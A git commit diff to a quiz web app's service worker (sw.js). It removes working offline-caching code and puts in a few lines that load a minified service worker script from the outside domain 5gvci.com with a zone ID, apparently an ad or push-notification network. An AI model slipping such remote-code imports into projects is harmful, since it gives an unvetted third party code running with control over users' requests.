0b93f1f71f3aaf1fe429c25eb02cd6f5c6406fcd
JOX ALSHMAL <albwsmstfy2@gmail.com>
2026-01-20 20:18:09 +0200

    Add files via upload

--- sw.js
+++ sw.js
@@ -1,53 +1,6 @@
-const CACHE_NAME = 'jox-quiz-v2';
-const ASSETS = [
-    '/',
-    '/index.html',
-    '/manifest.json'
-    // لا نضع questions.txt هنا لأننا نريده ديناميكياً
-];
-
-// 1. تثبيت الكاش للملفات الأساسية
-self.addEventListener('install', event => {
-    event.waitUntil(
-        caches.open(CACHE_NAME).then(cache => cache.addAll(ASSETS))
-    );
-});
-
-// 2. تفعيل وحذف الكاش القديم
-self.addEventListener('activate', event => {
-    event.waitUntil(
-        caches.keys().then(keys => Promise.all(
-            keys.map(key => {
-                if (key !== CACHE_NAME) return caches.delete(key);
-            })
-        ))
-    );
-});
-
-// 3. استراتيجية الجلب (Fetch Strategy)
-self.addEventListener('fetch', event => {
-    const url = new URL(event.request.url);
-
-    // إذا كان الطلب لملف الأسئلة -> Network First (الإنترنت أولاً)
-    if (url.pathname.endsWith('questions.txt')) {
-        event.respondWith(
-            fetch(event.request)
-                .then(networkResponse => {
-                    // تحديث الكاش بالنسخة الجديدة
-                    return caches.open(CACHE_NAME).then(cache => {
-                        cache.put(event.request, networkResponse.clone());
-                        return networkResponse;
-                    });
-                })
-                .catch(() => {
-                    // إذا فشل النت، هات من الكاش
-                    return caches.match(event.request);
-                })
-        );
-    } else {
-        // لباقي الملفات (HTML, CSS) -> Cache First (الكاش أولاً للسرعة)
-        event.respondWith(
-            caches.match(event.request).then(cached => cached || fetch(event.request))
-        );
-    }
-});
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 10493273
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
